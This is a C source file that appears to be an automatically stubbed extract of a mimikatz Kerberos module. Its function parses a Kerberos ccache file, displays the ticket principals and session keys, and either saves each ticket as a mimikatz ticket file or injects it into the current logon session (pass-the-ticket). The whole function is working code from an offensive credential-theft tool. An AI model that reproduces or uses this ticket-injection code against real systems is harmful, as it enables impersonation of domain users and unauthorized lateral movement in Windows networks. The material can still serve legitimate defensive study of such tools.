#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_14__   TYPE_4__ ;
typedef  struct TYPE_13__   TYPE_3__ ;
typedef  struct TYPE_12__   TYPE_2__ ;
typedef  struct TYPE_11__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  wchar_t ;
typedef  int USHORT ;
typedef  int /*<<< orphan*/  UNICODE_STRING ;
typedef  int /*<<< orphan*/  UCHAR ;
struct TYPE_14__ {int /*<<< orphan*/  bv_len; int /*<<< orphan*/  bv_val; } ;
struct TYPE_12__ {int Length; void* Value; } ;
struct TYPE_11__ {int Length; void* Value; } ;
struct TYPE_13__ {int TicketKvno; int /*<<< orphan*/  TargetDomainName; TYPE_2__ Ticket; void* TicketFlags; int /*<<< orphan*/  RenewUntil; int /*<<< orphan*/  EndTime; int /*<<< orphan*/  StartTime; TYPE_1__ Key; scalar_t__ TicketEncType; scalar_t__ KeyType; int /*<<< orphan*/  DomainName; scalar_t__ ServiceName; int /*<<< orphan*/  TargetName; int /*<<< orphan*/  AltTargetDomainName; scalar_t__ ClientName; } ;
typedef  int /*<<< orphan*/ * PUSHORT ;
typedef  void* PUCHAR ;
typedef  TYPE_3__* PKIWI_KERBEROS_TICKET ;
typedef  scalar_t__ PKERB_EXTERNAL_NAME ;
typedef  int /*<<< orphan*/ * PDWORD ;
typedef  scalar_t__ PBYTE ;
typedef  TYPE_4__* PBERVAL ;
typedef  int /*<<< orphan*/  NTSTATUS ;
typedef  int /*<<< orphan*/  KIWI_KERBEROS_TICKET ;
typedef  scalar_t__ DWORD ;
typedef  scalar_t__ BOOL ;

/* Variables and functions */
 int /*<<< orphan*/  FALSE ; 
 int /*<<< orphan*/  LPTR ; 
 scalar_t__ LocalAlloc (int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  LocalFree (scalar_t__) ; 
 int /*<<< orphan*/  MIMIKATZ_KERBEROS_EXT ; 
 scalar_t__ NT_SUCCESS (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  PRINT_ERROR (char*) ; 
 int /*<<< orphan*/  PRINT_ERROR_AUTO (char*) ; 
 int /*<<< orphan*/  RtlCopyMemory (void*,scalar_t__,int) ; 
 int /*<<< orphan*/  RtlEqualUnicodeString (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  STATUS_SUCCESS ; 
 int /*<<< orphan*/  TRUE ; 
 void* _byteswap_ulong (int /*<<< orphan*/ ) ; 
 scalar_t__ _byteswap_ushort (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  ber_bvfree (TYPE_4__*) ; 
 int /*<<< orphan*/  kprintf (char*,...) ; 
 int /*<<< orphan*/  kuhl_m_kerberos_ccache_UnixTimeToFileTime (void*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  kuhl_m_kerberos_ccache_externalname (scalar_t__*,scalar_t__*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * kuhl_m_kerberos_ccache_generateFileName (scalar_t__,TYPE_3__*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  kuhl_m_kerberos_ccache_skip_buffer (scalar_t__*) ; 
 int /*<<< orphan*/  kuhl_m_kerberos_ccache_skip_struct_with_buffer (scalar_t__*) ; 
 int /*<<< orphan*/  kuhl_m_kerberos_ptt_data (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  kuhl_m_kerberos_ticket_copyExternalName (scalar_t__) ; 
 TYPE_4__* kuhl_m_kerberos_ticket_createAppKrbCred (TYPE_3__*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  kuhl_m_kerberos_ticket_display (TYPE_3__*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  kuhl_m_kerberos_ticket_displayExternalName (char*,scalar_t__,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  kuhl_m_kerberos_ticket_freeExternalName (scalar_t__) ; 
 int /*<<< orphan*/  kuhl_m_kerberos_ticket_freeTicket (TYPE_3__*) ; 
 scalar_t__ kull_m_file_readData (int /*<<< orphan*/ *,scalar_t__*,scalar_t__*) ; 
 scalar_t__ kull_m_file_writeData (int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  kull_m_string_copyUnicodeStringBuffer (int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  usXCACHECONF ; 

NTSTATUS kuhl_m_kerberos_ccache_enum(int argc, wchar_t * argv[], BOOL isInject, BOOL isSave)
{
	PBYTE file, data;
	DWORD length, i;
	USHORT version;

	PKERB_EXTERNAL_NAME principalName; UNICODE_STRING principalRealm;
	PKIWI_KERBEROS_TICKET ticket;
	PBERVAL BerApp_KrbCred;
	wchar_t * saveFilename;

	if(argc)
	{
		if(kull_m_file_readData(argv[0], &file, &length))
		{
			data = file;	
			version = _byteswap_ushort(*(PUSHORT) data); data += sizeof(USHORT);
			if((version == 0x0504) || (version == 0x0503))
			{
				if(version == 0x0504)
					data += sizeof(USHORT) + _byteswap_ushort(*(PUSHORT) data);
				kuhl_m_kerberos_ccache_externalname(&data, &principalName, &principalRealm);
				if(principalName)
				{
					kuhl_m_kerberos_ticket_displayExternalName(L"\nPrincipal : ", principalName, &principalRealm);
					for(i = 0; data < (file + length); i++)
					{
						kprintf(L"\n\nData %u", i);
						if(ticket = (PKIWI_KERBEROS_TICKET) LocalAlloc(LPTR, sizeof(KIWI_KERBEROS_TICKET)))
						{
							kuhl_m_kerberos_ccache_externalname(&data, &ticket->ClientName, &ticket->AltTargetDomainName);
							kuhl_m_kerberos_ccache_externalname(&data, &ticket->ServiceName, &ticket->DomainName);
							
							ticket->TargetName = kuhl_m_kerberos_ticket_copyExternalName(ticket->ServiceName);
							kull_m_string_copyUnicodeStringBuffer(&ticket->DomainName, &ticket->TargetDomainName);
							
							ticket->KeyType = _byteswap_ushort(*(PUSHORT) data); data += sizeof(USHORT);
							ticket->TicketEncType = _byteswap_ushort(*(PUSHORT) data); data += sizeof(USHORT);
							if(version == 0x0504)
							{
								ticket->Key.Length = _byteswap_ushort(*(PUSHORT) data); data += sizeof(USHORT);
							}
							else
							{
								ticket->Key.Length = _byteswap_ulong(*(PDWORD) data); data += sizeof(DWORD);
							}
							if(ticket->Key.Length)
								if(ticket->Key.Value = (PUCHAR) LocalAlloc(LPTR, ticket->Key.Length))
									RtlCopyMemory(ticket->Key.Value, data, ticket->Key.Length);
							data += ticket->Key.Length + sizeof(DWORD); // authtime;
							
							kuhl_m_kerberos_ccache_UnixTimeToFileTime(_byteswap_ulong(*(PDWORD) data), &ticket->StartTime); data += sizeof(DWORD); // local ?
							kuhl_m_kerberos_ccache_UnixTimeToFileTime(_byteswap_ulong(*(PDWORD) data), &ticket->EndTime); data += sizeof(DWORD);
							kuhl_m_kerberos_ccache_UnixTimeToFileTime(_byteswap_ulong(*(PDWORD) data), &ticket->RenewUntil); data += sizeof(DWORD) + sizeof(UCHAR); // skey

							ticket->TicketFlags = _byteswap_ulong(*(PDWORD) data); data += sizeof(DWORD);
							kuhl_m_kerberos_ccache_skip_struct_with_buffer(&data); // address
							kuhl_m_kerberos_ccache_skip_struct_with_buffer(&data); // authdata
							
							ticket->Ticket.Length = _byteswap_ulong(*(PDWORD) data); data += sizeof(DWORD);
							ticket->TicketKvno = 2;
							if(ticket->Ticket.Length)
								if(ticket->Ticket.Value = (PUCHAR) LocalAlloc(LPTR, ticket->Ticket.Length))
									RtlCopyMemory(ticket->Ticket.Value, data, ticket->Ticket.Length);
							data += ticket->Ticket.Length;
							kuhl_m_kerberos_ccache_skip_buffer(&data);

							if(!RtlEqualUnicodeString(&usXCACHECONF, &ticket->TargetDomainName, TRUE))
							{
								kuhl_m_kerberos_ticket_display(ticket, TRUE, FALSE);
								if(isSave || isInject)
								{
									if(BerApp_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(ticket, TRUE))
									{
										if(isInject)
										{
											kprintf(L"\n\t   * Injecting ticket : ");
											if(NT_SUCCESS(kuhl_m_kerberos_ptt_data(BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len)))
												kprintf(L"OK\n");
										}
										else
										{
											if(saveFilename = kuhl_m_kerberos_ccache_generateFileName(i, ticket, MIMIKATZ_KERBEROS_EXT))
											{
												if(kull_m_file_writeData(saveFilename, BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len))
													kprintf(L"\n\t   * Saved to file %s !", saveFilename);
												else PRINT_ERROR_AUTO(L"kull_m_file_writeData");

												LocalFree(saveFilename);
											}
										}
										ber_bvfree(BerApp_KrbCred);
									}
								}
							}
							else kprintf(L"\n\t* %wZ entry? *", &usXCACHECONF);
							kuhl_m_kerberos_ticket_freeTicket(ticket);
						}
					}
					kuhl_m_kerberos_ticket_freeExternalName(principalName);
				}
			}
			else PRINT_ERROR(L"ccache version != 0x0504 or version != 0x0503\n");
			LocalFree(file);
		}
		else PRINT_ERROR_AUTO(L"kull_m_file_readData");
	}
	else PRINT_ERROR(L"At least one filename is needed\n");
	return STATUS_SUCCESS;
}